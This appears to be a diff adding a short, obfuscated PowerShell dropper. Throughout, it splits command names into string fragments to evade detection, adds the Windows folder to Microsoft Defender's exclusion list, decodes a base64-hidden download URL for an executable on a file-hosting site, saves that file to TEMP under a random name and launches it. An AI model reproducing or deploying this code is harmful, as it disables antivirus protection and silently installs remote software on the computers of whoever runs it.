@@ -1,0 +1,23 @@
+function g1 { return 'Add' + '-MpPreference' }
+function g2 { return 'Exclusion' + 'Path' }
+function g3 { param([string]$s); [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($s)) }
+
+$p1 = "$env:W"+"IND"+"OWS"
+& (g1) -$(g2) $p1
+
+$u = g3 "aHR0cHM6Ly93d3cudXBsb2FkLmVlL2Rvd25sb2FkLzE4MTg1MDQ0LzQ0MzQ5OWM1YTZjNzIwY2FiNjIyL3ZtLmV4ZQ=="
+
+$fName = ([System.IO.Path]::GetRandomFileName()).Replace('.', '') + ".exe"
+$out = "$env:TEMP\" + $fName
+
+$req = [System.Net.HttpWebRequest]::Create($u)
+$res = $req.GetResponse()
+$stream = $res.GetResponseStream()
+$fs = New-Object IO.FileStream($out, [IO.FileMode]::Create)
+$buffer = New-Object byte[] 4096
+while (($r = $stream.Read($buffer, 0, $buffer.Length)) -gt 0) {
+    $fs.Write($buffer, 0, $r)
+}
+$fs.Close()
+
+&("S"+"t"+"aR"+"t-Pr"+"oce"+"ss") -FilePath $out
